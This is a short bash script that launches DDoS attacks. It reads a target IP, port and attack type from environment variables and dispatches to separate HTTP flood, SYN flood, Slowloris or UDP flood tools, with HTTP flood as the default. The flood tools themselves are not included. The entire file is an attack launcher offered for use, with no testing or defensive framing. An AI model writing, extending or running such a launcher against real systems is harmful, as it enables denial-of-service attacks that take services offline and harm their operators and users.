#!/bin/bash

echo "Starting DDoS attack..."
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Attack type: $ATTACK_TYPE"

case $ATTACK_TYPE in
    "http_flood")
        echo "Starting HTTP flood attack..."
        ./http_flood.py
        ;;
    "syn_flood")
        echo "Starting SYN flood attack..."
        ./syn_flood.sh
        ;;
    "slowloris")
        echo "Starting Slowloris attack..."
        ./slowloris.py
        ;;
    "udp_flood")
        echo "Starting UDP flood attack..."
        ./udp_flood.sh
        ;;
    *)
        echo "Default: HTTP flood attack..."
        ./http_flood.py
        ;;
esac 